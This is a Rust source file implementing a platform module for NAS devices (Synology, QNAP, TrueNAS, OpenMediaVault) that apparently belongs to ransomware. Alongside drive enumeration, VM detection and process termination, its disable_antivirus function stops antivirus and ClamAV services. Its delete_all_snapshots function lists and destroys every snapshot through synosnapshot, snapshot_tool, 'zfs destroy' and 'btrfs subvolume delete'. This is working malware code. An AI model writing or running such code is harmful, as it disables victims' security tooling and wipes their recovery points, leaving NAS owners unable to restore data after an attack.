use super::platform::{Platform, ProcessInfo, SystemInfo, PlatformType};
use super::linux::LinuxPlatform;
use std::path::Path;
use std::process::Command;

#[cfg(unix)]
pub struct NASPlatform {
    linux: LinuxPlatform,
    nas_type: NASType,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum NASType {
    Synology,
    QNAP,
    TrueNAS,
    OpenMediaVault,
    Unknown,
}

#[cfg(unix)]
impl NASPlatform {
    pub fn new() -> Self {
        let nas_type = Self::detect_nas_type();
        
        NASPlatform {
            linux: LinuxPlatform::new(),
            nas_type,
        }
    }
    
    fn detect_nas_type() -> NASType {
        if std::fs::metadata("/etc/synoinfo.conf").is_ok() {
            NASType::Synology
        } else if std::fs::metadata("/etc/qnap.conf").is_ok() {
            NASType::QNAP
        } else if std::fs::metadata("/etc/TrueNAS-VERSION").is_ok() {
            NASType::TrueNAS
        } else if std::fs::metadata("/etc/omv.conf").is_ok() {
            NASType::OpenMediaVault
        } else {
            NASType::Unknown
        }
    }
}

#[cfg(unix)]
impl Platform for NASPlatform {
    fn platform_name(&self) -> &'static str {
        match self.nas_type {
            NASType::Synology => "Synology NAS",
            NASType::QNAP => "QNAP NAS",
            NASType::TrueNAS => "TrueNAS",
            NASType::OpenMediaVault => "OpenMediaVault",
            NASType::Unknown => "Unknown NAS",
        }
    }
    
    fn file_lock_check(&self, path: &Path) -> bool {
        self.linux.file_lock_check(path)
    }
    
    fn get_process_list(&self) -> Vec<ProcessInfo> {
        self.linux.get_process_list()
    }
    
    fn terminate_process(&self, pid: u32) -> bool {
        self.linux.terminate_process(pid)
    }
    
    fn get_network_drives(&self) -> Vec<String> {
        let mut drives = self.linux.get_network_drives();
        
        match self.nas_type {
            NASType::Synology => {
                if let Ok(content) = std::fs::read_to_string("/etc/synoinfo.conf") {
                    for line in content.lines() {
                        if line.starts_with("usb_port=") || line.starts_with("esata_port=") {
                            if let Some(value) = line.split('=').nth(1) {
                                drives.push(format!("/volume{}", value));
                            }
                        }
                    }
                }
            }
            NASType::QNAP => {
                if let Ok(entries) = std::fs::read_dir("/share") {
                    for entry in entries.flatten() {
                        if let Ok(path) = entry.path().into_os_string().into_string() {
                            drives.push(path);
                        }
                    }
                }
            }
            NASType::TrueNAS => {
                if let Ok(entries) = std::fs::read_dir("/mnt") {
                    for entry in entries.flatten() {
                        if let Ok(path) = entry.path().into_os_string().into_string() {
                            drives.push(path);
                        }
                    }
                }
            }
            _ => {}
        }
        
        drives
    }
    
    fn is_virtual_machine(&self) -> bool {
        self.linux.is_virtual_machine()
    }
    
    fn get_system_info(&self) -> SystemInfo {
        let mut info = self.linux.get_system_info();
        info.os_name = self.platform_name().to_string();
        info.platform_type = PlatformType::NAS;
        info
    }
    
    fn disable_antivirus(&self) -> Result<(), String> {
        println!("[NAS] Disabling antivirus and stopping services...");
        
        match self.nas_type {
            NASType::Synology => {
                let output = Command::new("synoservice")
                    .args(["--stop", "antivirus"])
                    .output();
                
                match output {
                    Ok(result) if result.status.success() => {
                        println!("[NAS] Synology antivirus stopped");
                        Ok(())
                    }
                    Ok(result) => Err(String::from_utf8_lossy(&result.stderr).to_string()),
                    Err(e) => Err(e.to_string()),
                }
            }
            NASType::QNAP => {
                let output = Command::new("qpkg_service")
                    .args(["stop", "antivirus"])
                    .output();
                
                match output {
                    Ok(result) if result.status.success() => {
                        println!("[NAS] QNAP antivirus stopped");
                        Ok(())
                    }
                    Ok(result) => Err(String::from_utf8_lossy(&result.stderr).to_string()),
                    Err(e) => Err(e.to_string()),
                }
            }
            NASType::TrueNAS => {
                let output = Command::new("service")
                    .args(["clamav", "stop"])
                    .output();
                
                match output {
                    Ok(result) if result.status.success() => {
                        println!("[NAS] TrueNAS ClamAV stopped");
                        Ok(())
                    }
                    Ok(result) => Err(String::from_utf8_lossy(&result.stderr).to_string()),
                    Err(e) => Err(e.to_string()),
                }
            }
            NASType::OpenMediaVault => {
                let output = Command::new("systemctl")
                    .args(["stop", "clamav-daemon"])
                    .output();
                
                match output {
                    Ok(result) if result.status.success() => {
                        println!("[NAS] OpenMediaVault ClamAV stopped");
                        Ok(())
                    }
                    Ok(result) => Err(String::from_utf8_lossy(&result.stderr).to_string()),
                    Err(e) => Err(e.to_string()),
                }
            }
            NASType::Unknown => {
                println!("[NAS] Unknown NAS type, skipping antivirus disable");
                Ok(())
            }
        }
    }
    
    fn enable_antivirus(&self) -> Result<(), String> {
        match self.nas_type {
            NASType::Synology => {
                use std::process::Command;
                let output = Command::new("synoservice")
                    .args(["--start", "antivirus"])
                    .output();
                
                match output {
                    Ok(result) if result.status.success() => Ok(()),
                    Ok(result) => Err(String::from_utf8_lossy(&result.stderr).to_string()),
                    Err(e) => Err(e.to_string()),
                }
            }
            _ => Ok(()),
        }
    }
    
    fn create_snapshot(&self, path: &Path) -> Result<(), String> {
        match self.nas_type {
            NASType::Synology => {
                use std::process::Command;
                let output = Command::new("synosnapshot")
                    .args(["--create", path.to_str().unwrap()])
                    .output();
                
                match output {
                    Ok(result) if result.status.success() => Ok(()),
                    Ok(result) => Err(String::from_utf8_lossy(&result.stderr).to_string()),
                    Err(e) => Err(e.to_string()),
                }
            }
            NASType::TrueNAS => {
                self.linux.create_snapshot(path)
            }
            _ => Err("Snapshot not supported on this NAS type".to_string()),
        }
    }
    
    fn restore_snapshot(&self, path: &Path) -> Result<(), String> {
        match self.nas_type {
            NASType::Synology => {
                use std::process::Command;
                let output = Command::new("synosnapshot")
                    .args(["--restore", path.to_str().unwrap()])
                    .output();
                
                match output {
                    Ok(result) if result.status.success() => Ok(()),
                    Ok(result) => Err(String::from_utf8_lossy(&result.stderr).to_string()),
                    Err(e) => Err(e.to_string()),
                }
            }
            NASType::TrueNAS => {
                self.linux.restore_snapshot(path)
            }
            _ => Err("Snapshot not supported on this NAS type".to_string()),
        }
    }
    
    fn delete_all_snapshots(&self) -> Result<(), String> {
        println!("[NAS] Deleting all snapshots...");
        
        match self.nas_type {
            NASType::Synology => {
                let output = Command::new("synosnapshot")
                    .args(["--list"])
                    .output();
                
                match output {
                    Ok(result) if result.status.success() => {
                        let output_str = String::from_utf8_lossy(&result.stdout);
                        let mut deleted_count = 0;
                        
                        for line in output_str.lines() {
                            if line.trim().is_empty() || line.contains("ID") {
                                continue;
                            }
                            
                            let parts: Vec<&str> = line.split_whitespace().collect();
                            if parts.len() >= 1 {
                                let snapshot_id = parts[0];
                                println!("[NAS] Deleting Synology snapshot: {}", snapshot_id);
                                
                                let delete_result = Command::new("synosnapshot")
                                    .args(["--delete", snapshot_id])
                                    .output();
                                
                                match delete_result {
                                    Ok(res) if res.status.success() => {
                                        println!("[NAS] Successfully deleted snapshot {}", snapshot_id);
                                        deleted_count += 1;
                                    }
                                    Ok(res) => {
                                        eprintln!("[NAS] Failed to delete snapshot {}: {}", 
                                            snapshot_id, String::from_utf8_lossy(&res.stderr));
                                    }
                                    Err(e) => {
                                        eprintln!("[NAS] Error deleting snapshot {}: {}", snapshot_id, e);
                                    }
                                }
                            }
                        }
                        
                        println!("[NAS] Deleted {} Synology snapshots", deleted_count);
                        Ok(())
                    }
                    Ok(result) => Err(String::from_utf8_lossy(&result.stderr).to_string()),
                    Err(e) => Err(e.to_string()),
                }
            }
            NASType::QNAP => {
                let output = Command::new("snapshot_tool")
                    .args(["--list"])
                    .output();
                
                match output {
                    Ok(result) if result.status.success() => {
                        let output_str = String::from_utf8_lossy(&result.stdout);
                        let mut deleted_count = 0;
                        
                        for line in output_str.lines() {
                            if line.trim().is_empty() || line.contains("ID") {
                                continue;
                            }
                            
                            let parts: Vec<&str> = line.split_whitespace().collect();
                            if parts.len() >= 1 {
                                let snapshot_id = parts[0];
                                println!("[NAS] Deleting QNAP snapshot: {}", snapshot_id);
                                
                                let delete_result = Command::new("snapshot_tool")
                                    .args(["--delete", snapshot_id])
                                    .output();
                                
                                match delete_result {
                                    Ok(res) if res.status.success() => {
                                        println!("[NAS] Successfully deleted snapshot {}", snapshot_id);
                                        deleted_count += 1;
                                    }
                                    Ok(res) => {
                                        eprintln!("[NAS] Failed to delete snapshot {}: {}", 
                                            snapshot_id, String::from_utf8_lossy(&res.stderr));
                                    }
                                    Err(e) => {
                                        eprintln!("[NAS] Error deleting snapshot {}: {}", snapshot_id, e);
                                    }
                                }
                            }
                        }
                        
                        println!("[NAS] Deleted {} QNAP snapshots", deleted_count);
                        Ok(())
                    }
                    Ok(result) => Err(String::from_utf8_lossy(&result.stderr).to_string()),
                    Err(e) => Err(e.to_string()),
                }
            }
            NASType::TrueNAS => {
                let output = Command::new("zfs")
                    .args(["list", "-t", "snapshot", "-H", "-o", "name"])
                    .output();
                
                match output {
                    Ok(result) if result.status.success() => {
                        let output_str = String::from_utf8_lossy(&result.stdout);
                        let mut deleted_count = 0;
                        
                        for line in output_str.lines() {
                            if line.trim().is_empty() {
                                continue;
                            }
                            
                            let snapshot_name = line.trim();
                            println!("[NAS] Deleting TrueNAS snapshot: {}", snapshot_name);
                            
                            let delete_result = Command::new("zfs")
                                .args(["destroy", snapshot_name])
                                .output();
                            
                            match delete_result {
                                Ok(res) if res.status.success() => {
                                    println!("[NAS] Successfully deleted snapshot {}", snapshot_name);
                                    deleted_count += 1;
                                }
                                Ok(res) => {
                                    eprintln!("[NAS] Failed to delete snapshot {}: {}", 
                                        snapshot_name, String::from_utf8_lossy(&res.stderr));
                                }
                                Err(e) => {
                                    eprintln!("[NAS] Error deleting snapshot {}: {}", snapshot_name, e);
                                }
                            }
                        }
                        
                        println!("[NAS] Deleted {} TrueNAS snapshots", deleted_count);
                        Ok(())
                    }
                    Ok(result) => Err(String::from_utf8_lossy(&result.stderr).to_string()),
                    Err(e) => Err(e.to_string()),
                }
            }
            NASType::OpenMediaVault => {
                let output = Command::new("btrfs")
                    .args(["subvolume", "list", "-s", "/"])
                    .output();
                
                match output {
                    Ok(result) if result.status.success() => {
                        let output_str = String::from_utf8_lossy(&result.stdout);
                        let mut deleted_count = 0;
                        
                        for line in output_str.lines() {
                            if line.trim().is_empty() || line.contains("ID") {
                                continue;
                            }
                            
                            let parts: Vec<&str> = line.split_whitespace().collect();
                            if parts.len() >= 9 {
                                let snapshot_path = parts[8];
                                println!("[NAS] Deleting OpenMediaVault snapshot: {}", snapshot_path);
                                
                                let delete_result = Command::new("btrfs")
                                    .args(["subvolume", "delete", snapshot_path])
                                    .output();
                                
                                match delete_result {
                                    Ok(res) if res.status.success() => {
                                        println!("[NAS] Successfully deleted snapshot {}", snapshot_path);
                                        deleted_count += 1;
                                    }
                                    Ok(res) => {
                                        eprintln!("[NAS] Failed to delete snapshot {}: {}", 
                                            snapshot_path, String::from_utf8_lossy(&res.stderr));
                                    }
                                    Err(e) => {
                                        eprintln!("[NAS] Error deleting snapshot {}: {}", snapshot_path, e);
                                    }
                                }
                            }
                        }
                        
                        println!("[NAS] Deleted {} OpenMediaVault snapshots", deleted_count);
                        Ok(())
                    }
                    Ok(result) => Err(String::from_utf8_lossy(&result.stderr).to_string()),
                    Err(e) => Err(e.to_string()),
                }
            }
            NASType::Unknown => {
                println!("[NAS] Unknown NAS type, skipping snapshot deletion");
                Ok(())
            }
        }
    }
}
